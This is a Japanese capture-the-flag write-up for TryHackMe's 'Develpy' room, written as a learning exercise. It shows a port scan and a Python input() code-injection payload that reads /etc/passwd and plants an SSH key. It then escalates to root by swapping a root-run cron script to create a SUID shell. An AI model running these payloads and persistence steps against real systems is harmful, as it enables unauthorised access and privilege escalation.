# Develpy CTF

https://tryhackme.com/room/bsidesgtdevelpy

## Enumeration

```shell
TARGET=10.201.111.177
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT      STATE SERVICE
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
```

```sh
sudo nmap -sS -sV -p22,10000 $TARGET

PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
10000/tcp open  snet-sensor-mgmt?
```

SSH、10000ポートのサービスは特定不能。

## 10000

数字の入力を求められる。ping の -c オプションのような挙動。

```sh
$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: 2

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.090 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.034 ms
```

コマンドインジェクションを試したらPythonのコールスタックが出た。  
inputで入力した文字列を int に変換できないというエラー。

```sh
$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: 1;id
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1
    1;id
     ^
SyntaxError: invalid syntax
```

マイナスを入れると1回も実行されない。

```sh
$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: -3

Exploit started, attacking target (tryhackme.com)...
```

IPアドレスを入れると構文エラー。

```sh
$ nc $TARGET 10000 

        Private 0days

 Please enther number of exploits to send??: 127.0.0.1
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1
    127.0.0.1
          ^
SyntaxError: invalid syntax
```

大きい数を入れると、range() でエラー発生。

```sh
$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: 1111111111111111111111111111111111111111111111111111111111

Exploit started, attacking target (tryhackme.com)...
Traceback (most recent call last):
  File "./exploit.py", line 9, in <module>
    for i in range(num_exploits):
OverflowError: range() result has too many items
```

Python input() の脆弱性について検索し、下記の記事を読んだ。  
https://medium.com/@abdelazimmohmmed/python-input-vulnerability-30b0bfea22c9

1+2 を入力すると、3回実行される。つまり、inputにはevalのような効果がある。

```sh
$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: 1+2

Exploit started, attacking target (tryhackme.com)...
Exploiting tryhackme internal network: beacons_seq=1 ttl=1337 time=0.054 ms
Exploiting tryhackme internal network: beacons_seq=2 ttl=1337 time=0.03 ms
Exploiting tryhackme internal network: beacons_seq=3 ttl=1337 time=0.049 ms
```

コマンド実行成功！

```sh
$ nc $TARGET 10000

        Private 0days

 Please enther number of exploits to send??: __import__("os").system("cat /etc/passwd")
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
king:x:1000:1000:develpy,,,:/home/king:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin

Exploit started, attacking target (tryhackme.com)...
```

SSH接続の確保

1. キーペア生成
2. .sshディレクトリ作成
3. authorized_keys 作成

```sh
ssh-keygen -t rsa

__import__("os").system("mkdir /home/king/.ssh")

__import__("os").system("echo 'ssh-rsa AAAAB3Nz[REDACTED] kali@kali' > /home/king/.ssh/authorized_keys")
```

SSH接続成功。

```sh
king@ubuntu:~$ ls -al
total 328
drwxr-xr-x 5 king king   4096 Nov  4 17:30 .
drwxr-xr-x 3 root root   4096 Aug 25  2019 ..
-rw------- 1 root root   2929 Aug 27  2019 .bash_history
-rw-r--r-- 1 king king    220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king   3771 Aug 25  2019 .bashrc
drwx------ 2 king king   4096 Aug 25  2019 .cache
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
-rw-rw-r-- 1 king king      5 Nov  4 17:34 .pid
-rw-r--r-- 1 king king    655 Aug 25  2019 .profile
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
drwxrwxr-x 2 king king   4096 Nov  4 17:32 .ssh
-rw-r--r-- 1 king king      0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
```

## 権限昇格

credentials.png をダウンロード。幾何学模様から判断して、piet。

最初、https://www.bertnase.de/npiet/npiet-execute.php で実行できなかったが、下記変換することでエラー回避できた。

```python
from PIL import Image
img = Image.open("credentials.png").convert("RGB")
img.save("credentials_true.png")
```

認証情報が無限に出てきた。

```sh
king:[REDACTED]king:[REDACTED]king:[REDACTED]king:[REDACTED]king:[REDACTED]・・・
```

sudoは無し。

```sh
ng@ubuntu:~$ sudo -l
[sudo] password for king: 
Sorry, user king may not run sudo on ubuntu.
```

不審なシェルファイル。

```sh
king@ubuntu:~$ cat root.sh
python /root/company/media/*.py
```

/etc/crontab

```sh
king@ubuntu:~$ cat /etc/crontab

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh
```

複雑なので整理する。

- /home/king/run.sh は、10000ポートのプロセスをリフレッシュしている。権限昇格とは関係ない。
- /home/king/root.sh は、root権限で `python /root/company/media/*.py` を実行している。
- /root/company/run.sh は root権限で実行されているが不明。

/home/king ディレクトリ自体に書き込み権限を持っているため、root.sh を削除＆作成することは可能。  
bashをコピーしてSUIDを付ける。

```sh
king@ubuntu:~$ rm ./root.sh
rm: remove write-protected regular file './root.sh'? y
king@ubuntu:~$ nano ./root.sh
```

昇格成功！

```sh
king@ubuntu:~$ ./bash -p
bash-4.3# id
uid=1000(king) gid=1000(king) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(king)
```

## 振り返り

- input() 関数の仕様は非常に勉強になった。公式ドキュメントを読むだけでは気づきようがないので、通常の開発でも注意が必要。
- kingのパスワードは頑張って入手したが、結果的には意味なかった。しかし piet の練習になったから良かった。
- `--codel_size 10` とすることで、repiet でも読めた。

```sh
repiet --codel_size 10 -x -o out2.txt ./credentials.png
```
